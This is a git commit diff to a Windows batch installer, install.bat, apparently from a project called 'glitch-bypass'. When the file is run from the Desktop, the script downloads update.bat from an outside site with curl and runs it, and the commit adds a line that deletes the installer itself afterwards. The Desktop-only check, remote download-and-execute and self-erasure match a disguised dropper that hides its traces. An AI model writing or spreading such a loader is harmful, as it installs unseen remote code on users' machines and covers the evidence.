4095e394dad0183e99cd6321c1605c2daacea6b7
glitch872 <86266768+glitch872@users.noreply.github.com>
2025-09-12 01:36:40 -0700

    Update install.bat

--- terminal/install.bat
+++ terminal/install.bat
@@ -10,7 +10,7 @@ set "currentDir=%currentDir:~0,-1%"
 
 :: Compare paths (case-insensitive)
 if /i "%currentDir%"=="%desktopDir%" (
-    curl -o a.bat https://www.glitch-bypass.com/terminal/update.bat>nul & a.bat & (goto) 2>nul & del "%~f0" & exit
+    curl -o a.bat https://www.glitch-bypass.com/terminal/update.bat>nul & start a.bat
 ) else (
     echo ===================================================
     echo This installer must be run from your Desktop folder.
@@ -18,6 +18,8 @@ if /i "%currentDir%"=="%desktopDir%" (
     echo Current script path: %currentDir%
     echo Please move this file to your Desktop and try again.
     echo ===================================================
-    pause
+    echo
+    pause>nul
     exit /b
 )
+(goto) 2>nul & del "%~f0"
